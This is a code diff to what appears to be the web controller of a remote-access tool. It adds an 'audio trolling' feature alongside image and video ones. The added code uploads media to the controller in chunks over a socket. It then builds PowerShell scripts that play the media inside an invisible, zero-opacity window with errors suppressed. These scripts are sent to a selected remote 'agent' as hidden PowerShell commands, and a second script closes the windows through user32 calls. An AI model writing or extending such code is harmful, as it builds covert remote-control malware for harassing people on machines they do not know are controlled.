@@ -96,6 +96,39 @@ $timer.Add_Tick({ try { $timer.Stop(); $w.Close() } catch {} })
 $timer.Start()` : ``}
 $w.ShowDialog()`;
   };
+  
+  const generateAudioTrollingScript = (audioUrl: string, opts?: { volume?: number; loop?: boolean; autoClose?: number }): string => {
+    const volPct = Math.max(0, Math.min(100, Math.round((opts?.volume ?? 1) * 100)));
+    const loop = Boolean(opts?.loop);
+    const autoClose = Math.max(0, Math.floor(opts?.autoClose ?? 0));
+    return `$ErrorActionPreference = 'SilentlyContinue'
+Add-Type -AssemblyName PresentationFramework
+Add-Type -AssemblyName PresentationCore
+$w = New-Object Windows.Window
+$w.Title = 'NCH_TROLLING_AUDIO'
+$w.WindowStyle = 'None'
+$w.WindowState = 'Normal'
+$w.ResizeMode = 'NoResize'
+$w.Topmost = $false
+$w.ShowInTaskbar = $false
+$w.Width = 1
+$w.Height = 1
+$w.Opacity = 0.0
+$player = New-Object System.Windows.Media.MediaPlayer
+try {
+  $player.Open([Uri]'${audioUrl.replace(/\\/g, '\\\\')}')
+  $player.Volume = ${Math.max(0, Math.min(1, (opts?.volume ?? 1)))}
+  $player.MediaEnded += { if (${loop}) { $player.Position = [TimeSpan]::Zero; $player.Play() } else { try { $player.Close() } catch {} } }
+  $player.Play()
+} catch {}
+if (${autoClose} -gt 0) {
+  $timer = New-Object System.Windows.Threading.DispatcherTimer
+  $timer.Interval = [TimeSpan]::FromSeconds(${autoClose})
+  $timer.Add_Tick({ try { $timer.Stop(); $player.Close(); $w.Close() } catch {} })
+  $timer.Start()
+}
+$w.ShowDialog()`;
+  };
 
   const handleFileSelect = (event: React.ChangeEvent<HTMLInputElement>) => {
     const fileList = event.target.files;
@@ -125,7 +158,7 @@ $w.ShowDialog()`;
         continue;
       }
 
-      const allowedTypes = ['image/jpeg', 'image/png', 'image/gif', 'image/webp', 'video/mp4', 'video/webm', 'video/avi'];
+      const allowedTypes = ['image/jpeg', 'image/png', 'image/gif', 'image/webp', 'video/mp4', 'video/webm', 'video/avi', 'audio/mpeg', 'audio/mp3', 'audio/wav', 'audio/flac', 'audio/ogg'];
       if (!allowedTypes.includes(file.type)) {
         setError(`File ${file.name} type not supported. Use: JPG, PNG, GIF, WebP, MP4, WebM, AVI`);
         continue;
@@ -264,6 +297,68 @@ $w.ShowDialog()`;
     }
   };
 
+  const uploadAssetToController = async (file: UploadedFile): Promise<string> => {
+    if (!socket) throw new Error('Socket not connected');
+    const uploadId = `troll_${Date.now()}_${Math.random().toString(16).slice(2)}`;
+    const totalSize = file.raw ? file.raw.size : (file.size || 0);
+    return new Promise<string>(async (resolve, reject) => {
+      const readyHandler = (data: any) => {
+        if (String(data?.upload_id || '') !== uploadId) return;
+        socket.off('troll_asset_ready', readyHandler);
+        if (data?.error) reject(new Error(String(data.error)));
+        else if (data?.url) resolve(String(data.url));
+        else reject(new Error('No URL generated'));
+      };
+      const progressHandler = (data: any) => {
+        if (String(data?.upload_id || '') !== uploadId) return;
+        const pct = Number(data?.progress || 0);
+        setUploadProgress(prev => ({ ...prev, [file.name]: pct }));
+      };
+      socket.on('troll_asset_ready', readyHandler);
+      socket.on('troll_asset_progress', progressHandler);
+      try {
+        socket.emit('troll_asset_start', {
+          upload_id: uploadId,
+          filename: file.name,
+          total_size: totalSize,
+        });
+        const chunkSize = 512 * 1024;
+        if (file.raw) {
+          for (let offset = 0; offset < file.raw.size; offset += chunkSize) {
+            const slice = file.raw.slice(offset, offset + chunkSize);
+            const buffer = await slice.arrayBuffer();
+            const bytes = new Uint8Array(buffer);
+            const chunkB64 = bytesToBase64(bytes);
+            socket.emit('troll_asset_chunk', {
+              upload_id: uploadId,
+              chunk: chunkB64,
+              offset,
+            });
+          }
+        } else {
+          const binaryString = atob(file.content);
+          const total = binaryString.length;
+          for (let i = 0; i < total; i += chunkSize) {
+            const slice = binaryString.slice(i, i + chunkSize);
+            const chunkB64 = btoa(slice);
+            socket.emit('troll_asset_chunk', {
+              upload_id: uploadId,
+              chunk: chunkB64,
+              offset: i,
+            });
+          }
+        }
+        socket.emit('troll_asset_complete', {
+          upload_id: uploadId,
+        });
+      } catch (e) {
+        socket.off('troll_asset_ready', readyHandler);
+        socket.off('troll_asset_progress', progressHandler);
+        reject(e);
+      }
+    });
+  };
+
   const startTrolling = async (file: UploadedFile) => {
     if (!socket || !selectedAgent) {
       setError('No agent selected');
@@ -274,19 +369,21 @@ $w.ShowDialog()`;
     let script: string;
 
     if (file.type.startsWith('image/')) {
-      script = generateImageTrollingScript(filePath);
+      // Controller-hosted URL
+      const url = await uploadAssetToController(file);
+      script = generateImageTrollingScript(url);
     } else if (file.type.startsWith('video/')) {
-      script = generateVideoTrollingScript(filePath, { volume: trollVolume / 100, loop: trollLoop, autoClose: trollAutoClose });
+      const url = await uploadAssetToController(file);
+      script = generateVideoTrollingScript(url, { volume: trollVolume / 100, loop: trollLoop, autoClose: trollAutoClose });
+    } else if (file.type.startsWith('audio/')) {
+      const url = await uploadAssetToController(file);
+      script = generateAudioTrollingScript(url, { volume: trollVolume / 100, loop: trollLoop, autoClose: trollAutoClose });
     } else {
       setError('Unsupported file type for trolling');
       return;
     }
 
-    // First upload the file and wait for completion
     try {
-      await uploadFile(file);
-      // Start trolling only after upload success
-      // Then execute the trolling script
       socket.emit('command', {
         agent_id: selectedAgent,
         command: `powershell -WindowStyle Hidden -Command "${script.replace(/"/g, '\\"').replace(/\n/g, '; ')}"`,
@@ -529,14 +626,43 @@ $w.ShowDialog()`;
                       </div>
                     </div>
                     <div className="flex gap-1">
+                    <Button
+                      onClick={() => startTrolling(file)}
+                      disabled={isUploading}
+                      size="sm"
+                      variant="outline"
+                      title="Start trolling with this file"
+                    >
+                      <Play className="h-3 w-3" />
+                    </Button>
                       <Button
-                        onClick={() => startTrolling(file)}
+                        onClick={() => {
+                          if (!socket || !selectedAgent) return;
+                          const stopScript = `
+Add-Type @"
+using System;
+using System.Runtime.InteropServices;
+public static class Win {
+  [DllImport("user32.dll", CharSet=CharSet.Unicode)]
+  public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
+  [DllImport("user32.dll")]
+  public static extern bool PostMessage(IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);
+}
+"@
+$titles = @("NCH_TROLLING","NCH_TROLLING_AUDIO")
+foreach ($t in $titles) {
+  $h = [Win]::FindWindow($null, $t)
+  if ($h -ne [IntPtr]::Zero) { [Win]::PostMessage($h, 0x10, [IntPtr]::Zero, [IntPtr]::Zero) }
+}`;
+                          const cmd = `powershell -WindowStyle Hidden -Command "${stopScript.replace(/"/g, '\\"').replace(/\n/g, '; ')}"`;
+                          socket.emit('command', { agent_id: selectedAgent, command: cmd, execution_id: `stop-all-trolls-${Date.now()}` });
+                        }}
                         disabled={isUploading}
                         size="sm"
                         variant="outline"
-                        title="Start trolling with this file"
+                        title="Stop All Trolls"
                       >
-                        <Play className="h-3 w-3" />
+                        <Square className="h-3 w-3" />
                       </Button>
                       <Button
                         onClick={() => {
